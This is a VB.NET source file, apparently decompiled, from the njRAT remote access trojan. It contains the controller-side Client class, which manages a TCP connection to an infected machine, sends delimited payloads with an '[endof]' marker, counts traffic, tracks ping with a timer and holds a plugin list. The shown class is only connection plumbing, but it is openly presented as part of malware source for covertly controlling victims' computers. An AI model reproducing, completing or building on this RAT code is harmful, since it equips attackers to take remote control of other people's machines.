Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Namespace njRAT
    Public Class Client
        ' Methods
        Public Sub New(ByVal c As TcpClient)
            Me.Client = c
            ind.F.Invoke(New _INV(AddressOf Me.inv))
        End Sub

        Private Sub inv()
            Dim timer As New Timer
            timer.Interval = 1
            timer.Enabled = True
            Me.T = timer
        End Sub

        Public Function ip() As String
            If (Me.oip.Length <= 0) Then
                Try
                    Me.oip = Me.Client.Client.RemoteEndPoint.ToString
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Me.oip = Me.GetHashCode.ToString
                    ProjectData.ClearProjectError()
                End Try
            End If
            Return Me.oip
        End Function

        Public Function Send(ByVal b As Byte()) As Boolean
            Dim flag As Boolean
            If Not Me.CN Then
                Return False
            End If
            Try
                Dim client As Socket = Me.Client.Client
                SyncLock client
                    Dim stream As New MemoryStream
                    stream.Write(b, 0, b.Length)
                    stream.Write(FN.SB(Me.SPL), 0, Me.SPL.Length)
                    Me.Client.Client.Send(stream.ToArray, 0, CInt(stream.Length), SocketFlags.None)
                    ind.SNT = (ind.SNT + CInt(stream.Length))
                    stream.Dispose()
                End SyncLock
                Me.Sending = False
                flag = True
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.Sending = False
                Me.CN = False
                flag = False
                ProjectData.ClearProjectError()
            End Try
            Return flag
        End Function

        Public Function Send(ByVal S As String) As Boolean
            Return Me.Send(FN.SB(S))
        End Function

        Public Sub SendNoWait(ByVal b As Byte())
            Me.Send(b)
        End Sub

        Private Sub T_Tick(ByVal sender As Object, ByVal e As EventArgs)
            Me.Ping += 1
        End Sub


        ' Properties
        Public Overridable Property T As Timer
            Get
                Return Me._T
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.T_Tick)
                If (Not Me._T Is Nothing) Then
                    RemoveHandler Me._T.Tick, handler
                End If
                Me._T = value
                If (Not Me._T Is Nothing) Then
                    AddHandler Me._T.Tick, handler
                End If
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("T")> _
        Private _T As Timer
        Public Buzy As Boolean = False
        Public Client As TcpClient
        Public CN As Boolean = True
        Public Isend As Boolean = False
        Public IsPNGED As Boolean = False
        Public L As ListViewItem
        Public lp As Integer = 0
        Public M As MemoryStream = New MemoryStream
        Private oip As String = ""
        Public Ping As Integer = &H3E8
        Public plg As List(Of String) = New List(Of String)
        Private Sending As Boolean = False
        Public SPL As String = "[endof]"

        ' Nested Types
        Private Delegate Sub _INV()
    End Class
End Namespace

